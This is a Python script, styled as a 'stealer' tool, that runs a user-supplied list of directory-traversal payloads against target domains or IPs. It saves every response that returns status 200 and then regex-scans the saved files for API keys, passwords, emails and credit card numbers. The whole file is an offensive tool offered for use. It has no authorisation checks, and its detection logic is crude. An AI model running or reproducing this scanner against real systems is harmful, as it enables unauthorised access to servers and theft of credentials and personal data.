import os
import sys
import subprocess
import requests
import re
from datetime import datetime
import random
import string
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ASCII Art
ascii_art = """
  ____  _      _      _       _____ _______ ______ _      ______ _____  
 |  _ \(_)    | |    | |     / ____|__   __|  ____| |    |  ____|  __ \ 
 | | | |_ _ __| | ___| |_   | (___    | |  | |__  | |    | |__  | |__) |
 | | | | | '__| |/ _ \ __|   \___ \   | |  |  __| | |    |  __| |  _  / 
 | |/ /| | |  | |  __/ |_    ____) |  | |  | |____| |____| |____| | \ \ 
 |___/ |_|_|  |_|\___|\__|  |_____/   |_|  |______|______|______|_|  \_\\
 
 2025 BY: David Cantrell AKA Stryk3r
"""

# Function to print ASCII art with random colors
def print_colored_ascii_art():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    for line in ascii_art.splitlines():
        print(random.choice(colors) + line)

print_colored_ascii_art()

# Check and install required libraries
def install_dependencies():
    required_libraries = ["requests", "colorama"]
    for lib in required_libraries:
        try:
            __import__(lib)
        except ImportError:
            print(f"{Fore.YELLOW}[*] Installing required library: {lib}{Style.RESET_ALL}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

# Function to generate a random folder name with date and time
def generate_folder_name():
    now = datetime.now()
    timestamp = now.strftime("%Y%m%d_%H%M%S")
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{timestamp}_{random_string}_traversalscan"

# Function to ensure proper domain formatting
def format_domain(domain):
    domain = domain.strip()
    if not domain.startswith(("http://", "https://")):
        return domain
    return domain

# Function to read targets from a file or input
def get_targets(target_input):
    if os.path.isfile(target_input):
        with open(target_input, "r") as f:
            targets = [format_domain(line.strip()) for line in f.readlines()]
    else:
        targets = [format_domain(target_input)]
    return targets

# Function to scan for directory traversal
def scan_directory_traversal(target, payloads, results_dir, verbose=False):
    vulnerable_urls = []
    downloaded_files = []

    for payload in payloads:
        for protocol in ["http://", "https://"]:
            if not target.startswith(("http://", "https://")):
                url = f"{protocol}{target}/{payload.strip()}"
            else:
                url = f"{target}/{payload.strip()}"

            try:
                if verbose:
                    print(f"{Fore.CYAN}[*] Testing: {url}{Style.RESET_ALL}")
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] Vulnerable URL Found: {url}{Style.RESET_ALL}")
                    vulnerable_urls.append(url)

                    # Save the response content to a file
                    file_name = f"response_{payload.strip().replace('/', '_')}_{protocol.replace('://', '')}.txt"
                    file_path = os.path.join(results_dir, file_name)
                    with open(file_path, "w", encoding="utf-8") as f:
                        f.write(response.text)
                    downloaded_files.append(file_path)

                    # Check headers for interesting vulnerabilities
                    headers = response.headers
                    for header, value in headers.items():
                        if "server" in header.lower() or "x-powered-by" in header.lower():
                            print(f"{Fore.YELLOW}[!] Interesting Header Found: {header}: {value}{Style.RESET_ALL}")

            except requests.RequestException as e:
                print(f"{Fore.RED}[-] Error scanning {url}: {e}{Style.RESET_ALL}")

    return vulnerable_urls, downloaded_files

# Function to scan files for sensitive information
def scan_files_for_sensitive_info(file_paths):
    sensitive_patterns = {
        "API Keys": r"([a-zA-Z0-9]{32})",
        "Passwords": r"password\s*=\s*['\"](.*?)['\"]",
        "Emails": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
        "Credit Cards": r"\b(?:\d[ -]*?){13,16}\b",
    }

    for file_path in file_paths:
        print(f"{Fore.BLUE}[*] Scanning file: {file_path}{Style.RESET_ALL}")
        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()
            for pattern_name, pattern in sensitive_patterns.items():
                matches = re.findall(pattern, content)
                if matches:
                    print(f"{Fore.GREEN}[!] Found {pattern_name}: {matches}{Style.RESET_ALL}")

# Main function
def main():
    # Install dependencies if missing
    install_dependencies()

    target_input = input(f"{Fore.BLUE}Enter a domain, IP address, or path to a target file (e.g., targets.txt): {Style.RESET_ALL}").strip()

    # Get targets from input or file
    try:
        targets = get_targets(target_input)
    except Exception as e:
        print(f"{Fore.RED}[-] Error reading targets: {e}{Style.RESET_ALL}")
        return

    payload_file = input(f"{Fore.BLUE}Enter the path to the payload.txt file: {Style.RESET_ALL}").strip()

    if not os.path.exists(payload_file):
        print(f"{Fore.RED}[-] Payload file not found!{Style.RESET_ALL}")
        return

    with open(payload_file, "r") as f:
        payloads = f.readlines()

    # Ask for verbose mode
    verbose = input(f"{Fore.BLUE}[?] Enable verbose mode? (y/n): {Style.RESET_ALL}").strip().lower() == "y"

    # Create a new folder for this scan
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    folder_name = generate_folder_name()
    results_dir = os.path.join(desktop_path, folder_name)
    os.makedirs(results_dir, exist_ok=True)
    print(f"{Fore.BLUE}[*] Results will be saved to: {results_dir}{Style.RESET_ALL}")

    all_vulnerable_urls = []
    all_downloaded_files = []

    for target in targets:
        print(f"{Fore.BLUE}[*] Scanning target: {target}{Style.RESET_ALL}")
        vulnerable_urls, downloaded_files = scan_directory_traversal(target, payloads, results_dir, verbose)
        all_vulnerable_urls.extend(vulnerable_urls)
        all_downloaded_files.extend(downloaded_files)

    if all_vulnerable_urls:
        print(f"{Fore.GREEN}[+] Directory traversal vulnerabilities found!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] No directory traversal vulnerabilities found.{Style.RESET_ALL}")

    if all_downloaded_files:
        scan_files = input(f"{Fore.BLUE}[?] Do you want to scan the downloaded files for sensitive information? (y/n): {Style.RESET_ALL}").strip().lower()
        if scan_files == "y":
            scan_files_for_sensitive_info(all_downloaded_files)

    print(f"{Fore.BLUE}[*] Scan completed. Results saved to: {results_dir}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
